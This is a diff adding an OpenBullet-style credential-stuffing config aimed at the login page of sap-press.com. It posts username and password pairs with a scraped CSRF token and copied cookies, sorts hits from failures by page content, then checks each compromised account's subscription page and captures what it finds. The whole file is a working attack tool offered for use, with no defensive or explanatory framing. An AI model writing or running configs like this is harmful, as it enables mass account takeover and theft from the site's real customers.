@@ -1,0 +1,57 @@
+[SETTINGS]
+{
+  "Name": "Sap-Press",
+  "SuggestedBots": 1,
+  "LastModified": "2018-08-08T18:49:20.8223379+00:00",
+  "AdditionalInfo": "",
+  "Author": "",
+  "Version": "1.0.0",
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "None",
+  "AllowedWordlist2": "None",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+#GET_LOGIN_PAGE REQUEST GET "https://www.sap-press.com/accounts/login/?next=/" AutoRedirect=TRUE 
+  CONTENT "" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+#PARSE_CSRFMIDDLEWARETOKEN PARSE "<SOURCE>" CSS "[name=csrfmiddlewaretoken]" "value" 0 -> VAR "CSRFMIDDLEWARETOKEN" "" "" 
+#PARSE_LOGIN-REDIRECT_URL PARSE "<SOURCE>" CSS "[name=login-redirect_url]" "value" 0 -> VAR "LOGIN-REDIRECT_URL" "" "" 
+#POST_LOGIN REQUEST POST "https://www.sap-press.com/accounts/login/?next=/" AutoRedirect=TRUE 
+  CONTENT "login-username=<USER>&login-password=<PASS>&csrfmiddlewaretoken=<CSRFMIDDLEWARETOKEN>&login-redirect_url=<LOGIN-REDIRECT_URL>&login_submit=Log In" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  COOKIE "Cookie: csrftoken=<CSRFMIDDLEWARETOKEN>; _ga=GA1.2.1119345271.1533749366; _gid=GA1.2.827735537.1533749366; _gat_UA-52209316-1=1; com.silverpop.iMAWebCookie=cc4917c5-a03e-5e77-bb51-235010947030; com.silverpop.iMA.session=9a816121-d68c-0e34-7863-b2124d447e4c; com.silverpop.iMA.page_visit=-1283665888:; cookie_usage=1" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Referer: https://www.sap-press.com/accounts/login/?next=/" 
+  HEADER "Origin: https://www.sap-press.com" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=TRUE 
+  KEYCHAIN Failure OR 
+    KEY "<SOURCE>" DoesNotContain "product-box" 
+  KEYCHAIN Success OR 
+    KEY "product-box" 
+REQUEST GET "https://www.sap-press.com/accounts/subscriptions/" AutoRedirect=TRUE 
+  CONTENT "" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=TRUE 
+  KEYCHAIN CUSTOM "FREE" OR 
+    KEY "You do not have any active subscriptions." 
+PARSE "<SOURCE>" LR "<%" " %>" Recursive=FALSE -> CAP "Subscription" "" "" 
